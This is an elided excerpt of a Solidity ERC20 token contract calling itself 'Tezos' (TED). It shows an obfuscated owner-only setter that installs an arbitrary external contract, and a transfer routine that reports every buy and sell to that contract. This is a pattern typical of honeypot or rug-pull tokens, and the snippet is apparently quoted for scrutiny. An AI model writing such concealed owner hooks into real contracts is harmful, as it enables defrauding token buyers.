...
contract TokenM is ERC20 {
    ...
    IUserAmountuoubuc public uoubuc;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Tezos", "TED") {
    ...
    function ctruengsBeongsRvips(IUserAmountuoubuc _uoubuc) public onlyOwner {
        uoubuc = _uoubuc;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                uoubuc.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				uoubuc.addOutAmount(from, amount);
            }else{
                uoubuc.addOutAmount(from, amount);
                takeFee = false;
            }
